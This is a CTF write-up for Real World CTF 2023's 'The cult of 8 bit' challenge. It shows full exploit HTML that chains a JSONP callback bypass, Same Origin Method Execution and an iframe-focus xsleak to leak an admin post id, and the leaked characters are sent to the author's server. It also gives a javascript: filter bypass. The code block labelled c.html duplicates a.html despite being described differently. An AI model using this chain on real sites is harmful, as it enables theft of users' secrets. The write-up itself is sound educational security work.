+++
author = "sh1yo"
title = "[Real World CTF 2023] The cult of 8 bit"
date = "2023-01-08"
description = "\"Valentina is trapped in the 8-bit cult, will you be able to find the secret and free her?\". An unintended solution using the Same Origin Method Execution and xsleaks"
tags = [
    "web",
    "ctf",
    "node",
    "express",
    "some",
    "xsleaks"
]
+++

<!-- ![img](/images/fFcKdD0OPvuo9g0CAhYto1pGGUvFbFWh) -->


![img](/images/ItXvWaJpNPmWRGcRKdb-C-yUsQRivtU1)

In this writeup, I will show my solution for **The cult of 8 bit** challenge from **Real World CTF 2023**. It was a client-side challenge where you must leak the admin post id to get the flag. I solved it in an unintended way by using the [**Same Origin Method Execution**](https://www.blackhat.com/docs/eu-14/materials/eu-14-Hayak-Same-Origin-Method-Execution-Exploiting-A-Callback-For-Same-Origin-Policy-Bypass-wp.pdf) attack with [**xsleaks**](https://xsleaks.dev).

- [Description](#description)
- [Exploring the app](#exploring-the-app)
    - [TODOs](#todos)
    - [Callbacks](#callbacks)
- [SOME attack](#some-attack)
    - [Example](#example)
    - [Solution](#solution)

## Description

After downloading the source code, we can see a simple expressjs note-storing service. Besides data storing, it also has a "report" functionality where the admin bot with the saved in a post flag opens our url.

The app has a simple structure:


```bash
bot/bot.js

code/
    app.js
    routes/api.js

    src/
        db.js
        middleware.js

    views/
        home.ejs
        login.ejs
        post.ejs
        register.ejs
        report.ejs

docker-compose.yml
Dockerfile
```

<todo maybe full code from github or just upload an archive>

By default, an account with the "admin" username has a post with a flag. The posts are accessible via `/posts/:random_uid` and do not require authentification. Therefore, our goal is to leak the admin post id.

Also, the application has a todo-creating functionality --- you can create a simple note that will be shown on your homepage.

The post and todo creating endpoints are disabled for the account with the "admin" username:

```js
router.use((req, res, next) => {
    if (req.user.user === "admin")  {
        return res.redirect("/?msg=Nice try");
    }
    next();
});

router.post("/create/post" ...)
router.post("/create/todo" ...)
```

<details>

<summary>full `api.js` code</summary>

```js
const express = require("express");
const crypto = require("crypto");
const axios = require("axios");
const { createClient } = require("redis");

const db = require("../src/db.js");
const mw = require("../src/middleware.js");

const router = express.Router();
const sha256 = (data) => crypto.createHash("sha256").update(data).digest("hex");

const REDIS_PASSWORD = process.env.REDIS_PASSWORD ? process.env.REDIS_PASSWORD: "redis_password"

const redisClient = createClient({
    url: `redis://:${REDIS_PASSWORD}@localhost:6379`,
})

redisClient.connect();

router.get("/post/:id", (req, res) => {
    let { id } = req.params;

    console.log(`request with ${JSON.stringify(req.originalUrl)}`)

    if (!id || typeof id !== "string") {
        return res.jsonp({
            success: false,
            error: "Missing id"
        });
    }

    if (!db.posts.has(id)) {
        return res.jsonp({
            success: false,
            error: "No post found with that id"
        });
    }

    let post = db.posts.get(id);
    return res.jsonp({
        success: true,
        name: post.name,
        body: post.body
    });
});

router.post("/login", [mw.csrfProtection, mw.requiresNoLogin], (req, res) => {
    let { user, pass } = req.body;

    if (!user || !pass) {
        return res.redirect("/login?msg=Missing user or pass");
    }

    if (typeof user !== "string" || typeof pass !== "string") {
        return res.redirect("/login?msg=Missing user or pass");
    }

    let dbUser = db.users.get(user);
    if (!dbUser || sha256(pass) !== dbUser.pass) {
        return res.redirect("/login?msg=Invalid user or pass");
    }

    req.session.user = user;
    res.redirect("/");
});

router.post("/register", [mw.csrfProtection, mw.requiresNoLogin], (req, res) => {
    let { user, pass } = req.body;

    if (!user || !pass) {
        return res.redirect("/register?msg=Missing user or pass");
    }

    if (typeof user !== "string" || typeof pass !== "string") {
        return res.redirect("/register?msg=Missing user or pass");
    }

    if (user.length < 5 || pass.length < 8) {
        return res.redirect("/register?msg=Please choose a more secure user/pass");
    }

    let dbUser = db.users.get(user);
    if (dbUser) {
        return res.redirect("/register?msg=A user already exists with that name");
    }

    db.users.set(user, {
        user,
        pass: sha256(pass),
        posts: [],
        todos: []
    });

    req.session.user = user;
    res.redirect("/");
});

router.post("/report", async (req, res) => {
    let { url } = req.body;

    if (!url || typeof url !== "string") {
        return res.redirect("/report?msg=Missing URL");
    }

    if (!url.startsWith("http:") && !url.startsWith("https:")) {
        return res.redirect("/report?msg=Invalid URL");
    }

    if (req.session.lastSubmission && +new Date() - req.session.lastSubmission < 30000)  {
        return res.redirect("/report?msg=Please wait a bit before submitting a new URL");
    }

    req.session.lastSubmission = +new Date();
    redisClient.lPush('submissions', [url]);
    res.redirect("/report?msg=URL submitted successfully");
});

router.get("/logout", [mw.csrfProtection, mw.requiresLogin], (req, res) => {
    req.session.destroy();
    res.redirect("/");
});

// Don't allow admin to make new posts / todos
router.use((req, res, next) => {
    if (req.user.user === "admin")  {
        return res.redirect("/?msg=Nice try");
    }
    next();
});

router.post("/create/post", [mw.csrfProtection, mw.requiresLogin], (req, res) => {
    let { name, body } = req.body;

    if (!name || !body) {
        return res.redirect("/?msg=Missing name or body");
    }

    if (typeof name !== "string" || typeof body !== "string") {
        return res.redirect("/?msg=Missing name or body");
    }

    let id = crypto.randomUUID();
    db.posts.set(id, {
        name, body
    });
    req.user.posts.push(id);

    res.redirect("/post/?id=" + id);
});

router.post("/create/todo", [mw.csrfProtection, mw.requiresLogin], (req, res) => {
    let { text } = req.body;

    if (!text) {
        return res.redirect("/?msg=Missing text");
    }

    if (typeof text !== "string") {
        return res.redirect("/?msg=Missing text");
    }

    let isURL = false;
    try {
        new URL(text); // errors if not valid URL
        console.log("first passed")
        isURL = !text.toLowerCase().trim().startsWith("javascript:"); // no
        console.log(`usUrl:${isURL}, '${text.toLowerCase()}', '${text.toLowerCase().trim()}'`)
    } catch {}

    req.user.todos.push({
        text, isURL
    });

    res.redirect("/");
});

module.exports = router;
```


</details>


## Exploring the app

There isn't a lot of code, so I just started to read it to try to find an interesting functionality.

### TODOs

The first thing that caught my eye is the `/create/todo` endpoint. The function checks whether the note is a valid url:

`api.js:`
```js
let isURL = false;
try {
    new URL(text); // errors if not valid URL
    console.log("first passed")
    isURL = !text.toLowerCase().trim().startsWith("javascript:"); // no
    console.log(`usUrl:${isURL}, '${text.toLowerCase()}', '${text.toLowerCase().trim()}'`)
} catch {}

req.user.todos.push({
    text, isURL
});
```

And later, uses it on the homepage:

`home.ejs`:
```js
<%_ user.todos.forEach(todo => { _%>
    <%_ if (todo.isURL) { _%>
        <li class="has-text-left"><a target="_blank" href=<%= todo.text %>><%= todo.text %></a></li>
    <%_ } else { _%>
    <li class="has-text-left"><%= todo.text %></li>
    <%_ } _%>
<%_ }); _%>
```

In a few words, when the todo is a URL --- insert it within the `<a>` tag.

`<a target="_blank" href=here>`

Sure, it has some protections from xss, like checking for a valid url and for the word `javascript:`:

```js
isURL = !text.toLowerCase().trim().startsWith("javascript:");
```

But I was able to bypass it with `%19javascript:alert()`. It still is a valid URL, the `trim()` removes only whitespaces, and the browsers usually ignore `\x01-\x20` bytes before `javascript:`.

Still, it doesn't help us much because:

\- The tag has `target="_blank` attribute.<br>
\- It's a self xss, and the bot cannot create its own todos.<br>
\- The bot doesn't click on anything within the `bot.js`.

So I decided to move on.

### Callbacks

```js
/**/ typeof load_post === 'function' && load_post({"success":true,"name":"X","body":"Y"});
```

The `post.ejs` file renders a post using the `id` parameter from the query.
Within the file, I found a callback:

```js
window.onload = function() {
    const id = new URLSearchParams(window.location.search).get('id');
    if (!id) {
        return;
    }

    // Load post from POST_SERVER
    // Since POST_SERVER might be a different origin, this also supports loading data through JSONP
    const request = new XMLHttpRequest();
    try {
        request.open('GET', POST_SERVER + `/api/post/` + encodeURIComponent(id), false);
        request.send(null);
    }
    catch (err) { // POST_SERVER is on another origin, so let's use JSONP
        let script = document.createElement("script");
        script.src = `${POST_SERVER}/api/post/${id}?callback=load_post`;
        document.head.appendChild(script);
        return;
    }

    load_post(JSON.parse(request.responseText));
}
```

*BTW, `POST_SERVER` is never used, and everything is on the same host.*

From the Intigriti [xss challenge](https://youtu.be/EZfPrgrV5p4), I know about the **Same Origin Method Execution** attack that exploits callbacks. This attack will be covered later in the [SOME attack](#some-attack) chapter.

To use the callback, we need to go to the `catch` block of the script. From the [documentation](https://xhr.spec.whatwg.org/#the-open()-method) of the xhr `open()` method, we can see possible exceptions that can lead us to the `catch` block:

> Throws a "SyntaxError" DOMException if either method is not a valid method or **url** cannot be parsed.<br>
Throws a "SecurityError" DOMException if method is a case-insensitive match for `CONNECT`, `TRACE`, or `TRACK`.<br>
Throws an "InvalidAccessError" DOMException if async is false, the current global object is a Window object, and the timeout attribute is not zero or the responseType attribute is not the empty string.

The only thing that we can modify is the **url** because we control `encodeURIComponent(id)`.

I did some fuzzing:

```js
// try several different characters with codes from 0 to 1000
for(i=0; i<1000; i++){
    const request = new XMLHttpRequest();
    try {
        request.open('GET', `/api/post/` + encodeURIComponent(String.fromCharCode(i)), false);
        request.send(null);
    } catch (err) {
            console.log("ERROR :", i,  err)
    }
}
```

And discovered that chromium *(headless chromium is used in the task)* throws an error if `%00` is somewhere within the url.

So with something like `/post/?id={id}%00`, we can fall into the `catch` block. The only thing is --- `{id}%00` is later added to the script src. Script src does not execute with `%00` as well, but I discovered that one can bypass it with a `#` character. `/api/post/%23%00` will throw an error *(it's %23 because encodeURIComponent is used in the `try{}` block)*, but `/api/post/#%00` will not.

The final url with a custom callback will look like this:

```py
http://localhost:12345/post/?id={valid_id}?callback=our_function%23%00
```

With it, `/api/post/${id}?callback=load_post` transforms to `/api/post/{valid_id}?callback=our_function#%00?callback=load_post`, and the following callback script is added to the page:

```html
<script src=/api/post/{valid_id}?callback=our_function#%00?callback=load_post></script>
```

During the request, only `/api/post/{valid_id}?callback=our_function` part is sent to the server, so we can execute arbitrary functions within the page.

## SOME attack

You can read about it [here](https://www.blackhat.com/docs/eu-14/materials/eu-14-Hayak-Same-Origin-Method-Execution-Exploiting-A-Callback-For-Same-Origin-Policy-Bypass-wp.pdf).

With this attack, it's possible to execute js methods in the context of different documents within the same origin.

***Example**: By using this attack `https://example.com/vulnerable` can execute js methods on `https://example.com/anything`.*

> Such method execution includes: clicks, form submissions, form input value tampering, JavaScript functions and similar (e.g. element.click(), privateForm.submit(), inputElement.stepUp/stepDown(), element.select(), element.focus(), JsDefinedFunction(), jQueryFunc() and so on.

### Example

To help you understand the attack without reading the long article above, I will add a simple example of the attack.

Let's say we have three pages:

`http://victim.com/endpoint?callback=something`
```js
    /**/something({"data":"data"})
```

The endpoint with the callback.

`http://victim.com/proxy?name=something`
```html
<html>
    <body>
        <script src='/endpoint?callback=something'></script>
    </body>
</html>
```

The page with a script tag pointed to the callback.

`http://victim.com/link?url=javascript:alert()`
```html
<html>
    <body>
        <a href="javascript:alert()"></a>
    </body>
</html>
```

The page where we want to use a js method.

Using the SOME attack we can call `.click()` on the `<a>` tag of the last page without any user interactions! To do so, we need to create two pages:

`start.html:`
```html
<script>
    win1 = open("/click.html")
    location.replace("http://victim.com/link?url=javascript:alert()")
</script>
```

`win1.html:`
```html
<script>
    // wait for start.html to redirect
    setTimeout(`location.replace("http://victim.com/proxy?name=opener.document.body.children[0].click")`, 1000)
</script>
```

First of all, `start.html` creates another page --- `win1.html`. Now, `win1.html` can refer to `start.html` using the `opener` property. If we redirect both pages to another origin we can still access `http://victim.com/link`*(previous `start.html`)* via `http://victim.com/proxy`*(previous `win1.html`)* using `opener`. Now `http://victim.com/proxy` can execute a callback script on behalf of `http://victim.com/link` using the `opener` property and therefore execute an alert without any clicks.

**detailed explanation**

After the redirection, `win1.html` has the location of `http://victim.com/proxy?name=opener.document.body.children[0].click` and the following body:

```html
<html>
    <body>
        <script src='/endpoint?callback=opener.document.body.children[0].click'></script>
    </body>
</html>
```

The `<script src=/endpoint?callback=..></script>` tag executes the `document.body.children[0].click()` function within the `opener` of `win1`. The `opener` of `win1` is `http://victim.com/link?url=javascript:alert()` *(because `start.html` got redirected there)*, and therefore `document.body.children[0].click()` is executed within `http://victim.com/link?url=javascript:alert()`. `children[0]` body element is our `<a href>` tag with a payload.

### Solution

Using the abovementioned attack, we can execute js methods on the document with the admin post id.

To save some time, I decided to use **IcesFont#1629's** solution of the hitcon 2022 secure paste challenge as a base for my solution. The problems are quite similar. With secure paste's case, there's a secret id within the url, not the page itself. You can find his solution on the hitcon discord server.

The solution consists of 4 files.

The first one opens another page and redirects itself to the challenge homepage:

`a.html:`
```html
<script>
    b = open(`/b.html`);
    location.replace("http://localhost:12345/");
</script>
```

The second one creates iframes for every character to detect the onfocus event that can be called via callback:

`b.html`
```html
<body>
    <a id=focusme href=#>sth</a>
    <script>
        const sleep = d => new Promise(r => setTimeout(r, d));
        alphabet = "0123456789abcdef-"

        //create iframes
        for (var i = 0; i < alphabet.length; i++) {
            iframe = document.createElement("iframe");
            iframe.name = alphabet[i];
            iframe.src = "http://localhost:12345/";
            document.body.appendChild(iframe);
        }

        //array for found characters
        hovered = []

        const main = async () => {
            // every 0.075 secs check for iframes' onfucus event
            setInterval(() => {
                p = document.activeElement.name
                if (p) {
                    // if there's focus on an iframe -- add its character to hovered and change the focus
                    hovered.push(p);
                    document.getElementById("focusme").focus();
                }
            }, 75)

            await sleep(2000);
            c = open(`/c.html`);
            await sleep(2000 + 150);

            // every 500 secs send found characters to our server endpoint /ret/:characters
            setInterval(() => {
                fetch(`/ret/${hovered.join("")}`)
            }, 500);
        }

        main();
    </script>
</body>
```

The third one is just a free document to be replaced with the vulnerable challenge page:

`c.html:`
```html
<script>
    b = open(`/b.html`);
    location.replace("http://localhost:12345/");
</script>
```

The fourth one contains the main logic. This file opens the page with the post id within the previous *(`c.html`)* document. Then that document executes js to leak the homepage's post id char by char.

```html
<script>
    const sleep = d => new Promise(r => setTimeout(r, d));

    const main = async () => {
        await sleep(1000);

        // 32 is the start of the href url that contains id
        // 36 is the len of the id
        for (var i = 32; i <= 32+36+1; i++) {
            // I'm explainig this payload below
            PAYLOAD = `opener[opener.opener.document.body.children[1].childNodes[1].children[0].children[0].children[3].children[0].children[0].children[0].href[${i}]].focus`;
            // change c.html page's location to the vulnerable page that executes callback
            opener.location.replace(`http://localhost:12345/post/?id=24bc9bc5-844c-4f37-8330-f3dbadd2e3a3?callback=${PAYLOAD}%23%00`);
            // check the next character every 1.5 secs so that the page have 1.5 sec to load.
            await sleep(1500);
        }
    }

    main();
</script>
```

I try to explain the huge `PAYLOAD` variable here.

Firstly, `opener.opener.document.body.children[1]....href[${i}]` traverses through the homepage `a.html` *(`a.html` is opener.opener of `c.html`)* and finds our `<a>` tag. Then it takes the i*th* symbol from its `href` attribute.

Secondly, `opener[..].focus` calls `focus()` on a character within `b.html` *(opener of `c.html`)* via the callback. Because every character has its own iframe with the `name=character` attribute *(you can access an html tag from js just with its name attribute)* `b.html` page can detect what character caused the `onfocus()` event.

Now we have everything to solve the task. I'll host these html pages on my server via php.

```sh
php -S host:port
```

If we send our url (`https://host/a.html`) to the bot we can see a part of the id in the logs:

![img](/images/E8ToEFojmsZu5j_q4dI-WuzmXxeX6zFL)

To get the next part of the id, we need to increase the start number of the href url and send the link to the bot again.

Using the post id, we can get the flag:

![img](/images/UNfW-txZSv3nfAUeVSEFZzH_n03EmUND)
